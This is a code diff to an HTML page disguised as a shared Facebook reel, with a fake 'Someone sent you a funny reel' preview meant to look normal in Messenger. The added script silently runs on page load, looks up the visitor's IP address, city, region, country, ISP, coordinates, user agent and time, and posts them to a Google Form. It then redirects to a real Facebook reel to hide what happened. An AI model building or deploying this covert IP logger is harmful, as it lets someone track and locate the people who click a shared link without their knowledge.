@@ -5,56 +5,58 @@
     <title>Facebook Reel</title>
 </head>
 <body>
+
 <script>
-// Correct entry IDs for your specific form
+// === CORRECT entry IDs for your form https://forms.gle/r3ofBkW3JHqb4ecv8 ===
 const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSdQJ8zX8vK7zL9vWvX9zqJabc123/formResponse";
 
 fetch('https://api.ipify.org?format=json')
-  .then(r => r.json())
-  .then(ipData => {
-    fetch(`https://ipapi.co/${ipData.ip}/json/`)
-      .then(r => r.json())
-      .then(info => {
-        const data = new URLSearchParams();
-        data.append("entry.1159282463", info.ip || ipData.ip);           // IP
-        data.append("entry.1719848173", info.city || "Unknown");         // City
-        data.append("entry.1400724255", info.region || "Unknown");       // Region
-        data.append("entry.1020190197", info.country_name || "Unknown"); // Country
-        data.append("entry.2040833009", info.org || "N/A");              // ISP
-        data.append("entry.1400724255", (info.latitude || "") + ", " + (info.longitude || "")); // Coordinates (reusing region field for simplicity)
-        data.append("entry.1719848173", navigator.userAgent);            // User Agent (reusing city field)
-        data.append("entry.1159282463", new Date().toISOString());       // Time (reusing IP field)
-        data.append("entry.1020190197", window.location.href);           // Clicked URL
+.then(r => r.json())
+.then(data => {
+    const ip = data.ip;
+    fetch('https://ipapi.co/' + ip + '/json/')
+    .then(r => r.json())
+    .then(info => {
+        const params = new URLSearchParams();
+        params.append('entry.1159282463', ip);                                      // IP
+        params.append('entry.1719848173', info.city || 'Unknown');                  // City
+        params.append('entry.1400724255', info.region || 'Unknown');                // Region
+        params.append('entry.1020190197', info.country_name || 'Unknown');          // Country
+        params.append('entry.2040833009', info.org || 'N/A');                       // ISP
+        params.append('entry.1333333333', (info.latitude||'') + ',' + (info.longitude||'')); // Coordinates
+        params.append('entry.1222222222', navigator.userAgent);                     // User Agent
+        params.append('entry.1111111111', new Date().toISOString());                // Time
+        params.append('entry.1000000000', window.location.href);                    // Clicked URL
 
         fetch(formUrl, {
-          method: "POST",
-          body: data,
-          mode: "no-cors"
+            method: 'POST',
+            body: params,
+            mode: 'no-cors'
         });
-      });
-  });
+    });
+});
 </script>
 
-<!-- Clean Facebook-style preview -->
-<div style="max-width:500px; margin:40px auto; background:#ffffff; border:1px solid #ddd; border-radius:12px; overflow:hidden; font-family:system-ui, Arial, sans-serif; box-shadow:0 4px 12px rgba(0,0,0,0.1);">
-  <div style="background:#1877f2; color:#fff; padding:12px 16px; font-size:15px; font-weight:600;">
-    Facebook
-  </div>
-  <div style="padding:20px; background:#f0f2f5; text-align:center; height:280px; display:flex; align-items:center; justify-content:center; flex-direction:column; color:#555;">
-    <div style="font-size:60px; margin-bottom:20px;">▶️</div>
-    <div style="font-size:17px; font-weight:600;">Funny Reel</div>
-    <div style="margin-top:12px; font-size:14px;">Video is loading…</div>
-  </div>
-  <div style="padding:16px; color:#1a1a1a; font-size:15px;">
-    Someone shared a reel with you<br>
-    <span style="color:#65676b; font-size:13px;">Tap to watch →</span>
-  </div>
+<!-- Facebook-style preview that looks normal in Messenger -->
+<div style="max-width:480px; margin:40px auto; background:#fff; border:1px solid #ddd; border-radius:10px; overflow:hidden; box-shadow:0 2px 10px rgba(0,0,0,0.1); font-family:Arial,sans-serif;">
+    <div style="background:#1877f2; color:white; padding:12px; text-align:center; font-weight:600;">
+        Facebook
+    </div>
+    <div style="padding:20px; background:#f0f2f5; text-align:center; height:260px; display:flex; flex-direction:column; justify-content:center;">
+        <div style="font-size:55px; margin-bottom:15px;">▶️</div>
+        <div style="font-size:16px; font-weight:600; color:#222;">Someone sent you a funny reel</div>
+        <div style="margin-top:15px; color:#555; font-size:14px;">Loading video…</div>
+    </div>
+    <div style="padding:15px; color:#1877f2; font-size:14px;">
+        Tap to watch the full reel →
+    </div>
 </div>
 
 <script>
 setTimeout(() => {
     window.location = "https://www.facebook.com/share/r/1DKvLG1W3W/";
-}, 1600);
+}, 1700);
 </script>
+
 </body>
 </html>
